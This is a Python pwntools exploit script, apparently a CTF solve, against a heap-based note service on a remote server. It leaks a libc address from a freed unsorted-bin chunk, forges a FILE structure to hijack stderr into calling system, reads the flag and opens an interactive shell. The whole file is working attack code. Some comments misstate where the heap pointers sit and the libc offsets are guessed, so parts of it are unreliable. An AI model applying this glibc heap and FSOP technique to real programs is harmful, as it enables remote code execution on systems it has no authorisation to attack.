#!/usr/bin/env python3
"""
Fix the leak issue by reading from offset in unsorted bin chunk
"""

from pwn import *

elf = ELF('./chal', checksec=False)
libc = ELF('./libc.so.6', checksec=False)

context.binary = elf
context.log_level = 'info'

io = remote('amt.rs', 26797)

def create(idx, size, data):
    io.sendlineafter(b'operation: ', b'1')
    io.sendlineafter(b'note: ', str(idx).encode())
    io.sendlineafter(b'size: ', hex(size).encode())
    io.sendafter(b'data: ', data)

def delete(idx):
    io.sendlineafter(b'operation: ', b'2')
    io.sendlineafter(b'note: ', str(idx).encode())

def view(idx):
    io.sendlineafter(b'operation: ', b'3')
    io.sendlineafter(b'note: ', str(idx).encode())
    io.recvuntil(b'data: ')
    return io.recvline()

success("Attempting to leak libc properly")

# The key is: unsorted bin chunks have fd/bk at offset +0x10
# If we allocate a chunk with NON-NULL data FIRST
# Then free it to unsorted bin
# The libc pointers will be at +0x10, but our data is at +0x00

# So printf will print our data, then potentially continue to libc pointer!

info("Creating chunk with printable bytes that don't have nulls")

# Fill with bytes that are printable and won't stop printf early
# Use values like 0x20-0x7e (ASCII printable)
payload = b'\x20' * 0x10  # 16 spaces before the libc pointer location

create(0, 0x500, payload + b'A' * (0x500 - len(payload)))
create(1, 0x20, b'guard')

delete(0)

# Now chunk 0 has:
# +0x00: our spaces (0x20 bytes)
# +0x10: fd pointer to main_arena (libc address!)
# +0x18: bk pointer to main_arena (libc address!)

info("Viewing chunk to get leak")

try:
    leak_data = view(0)
    info(f"Leak length: {len(leak_data)}")
    info(f"Leak hex: {leak_data[:50].hex()}")

    # The leak should start with our spaces, then have libc pointer
    if len(leak_data) > 0x10:
        # Extract bytes starting at offset 0x10
        libc_bytes = leak_data[0x10:0x10+8]

        if len(libc_bytes) >= 6:
            libc_leak = u64(libc_bytes.ljust(8, b'\x00'))
            success(f"Leaked address: {hex(libc_leak)}")

            # Calculate libc base
            # Unsorted bin fd points to main_arena + 0x60
            # main_arena is at libc + offset (varies by version)
            # For glibc 2.42, try different offsets

            for offset in [0x21ace0, 0x21ac80, 0x211b20, 0x219ce0]:
                libc_test = libc_leak - offset
                if (libc_test & 0xfff) == 0:  # Page aligned
                    libc.address = libc_test
                    success(f"Libc base: {hex(libc.address)}")
                    success(f"system @ {hex(libc.symbols['system'])}")
                    success(f"_IO_wfile_jumps @ {hex(libc.address + 0x233228)}")
                    break
        else:
            warn("Didn't get enough bytes for libc leak")
    else:
        warn(f"Leak too short: {leak_data}")

except Exception as e:
    error(f"Leak failed: {e}")

info("Now we have libc base, continue with FSOP...")

# Create fake FILE structure with actual addresses
_IO_wfile_jumps = libc.address + 0x233228
stderr = libc.address + libc.symbols['_IO_2_1_stderr_']
system = libc.symbols['system']

info(f"Targets: stderr={hex(stderr)}, system={hex(system)}")

# Craft the fake FILE per writeup
fake_file = flat({
    0x00: u32(0xfbad0101),  # _flags
    0x04: b';sh\x00',
    0x70: stderr - 0x10,  # _lock
    0xa0: stderr - 0x10,  # _wide_data
    0xd8: _IO_wfile_jumps + 0x40,  # vtable
    0xe0: system,  # _IO_save_end (used as function pointer)
}, length=0x200, filler=b'\x00')

create(2, 0x200, fake_file)

info("Fake FILE created, attempting to trigger...")

io.sendline(b'999')
io.sendline(b'0')

time.sleep(1)

try:
    io.sendline(b'cat flag*')
    time.sleep(1)
    output = io.recvall(timeout=2)

    if b'{' in output:
        success(f"FLAG: {output}")
    else:
        info(f"Output: {output[:300]}")
except:
    pass

io.interactive()
